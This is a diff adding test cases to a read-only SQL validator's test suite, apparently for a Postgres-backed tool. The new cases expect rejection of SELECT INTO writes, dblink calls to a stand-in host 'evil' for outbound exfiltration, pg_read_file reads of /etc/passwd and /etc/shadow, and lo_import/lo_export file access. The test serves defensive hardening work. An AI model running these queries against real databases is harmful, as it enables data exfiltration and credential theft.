@@ -40,6 +40,33 @@ describe('validateReadOnlySql', () => {
       /CTE containing a write|dangerous keyword/i,
     ],
     ['', /empty sql/i],
+    // C2: validator gaps
+    // SELECT col INTO new_table FROM old_table is Postgres "CREATE TABLE AS"
+    // semantics — writes. No INSERT/CREATE keyword appears textually so the
+    // word-list didn't catch it.
+    [
+      'SELECT id INTO new_users FROM users',
+      /SELECT INTO is not allowed|dangerous keyword/i,
+    ],
+    [
+      'SELECT * INTO new_users FROM users WHERE x=1',
+      /SELECT INTO is not allowed|dangerous keyword/i,
+    ],
+    // dblink / dblink_exec — outbound exfil from inside Postgres
+    [
+      "SELECT * FROM dblink('host=evil port=5432 user=foo','SELECT 1') AS t(x int)",
+      /dangerous keyword/i,
+    ],
+    [
+      "SELECT dblink_exec('host=evil','INSERT INTO target VALUES (1)')",
+      /dangerous keyword/i,
+    ],
+    // pg_read_file / pg_read_binary_file — filesystem read via superuser/role
+    ["SELECT pg_read_file('/etc/passwd')", /dangerous keyword/i],
+    ["SELECT pg_read_binary_file('/etc/shadow')", /dangerous keyword/i],
+    // lo_import / lo_export — large-object filesystem I/O
+    ["SELECT lo_import('/tmp/x')", /dangerous keyword/i],
+    ["SELECT lo_export(1234,'/tmp/x')", /dangerous keyword/i],
   ];
 
   for (const sql of allow) {
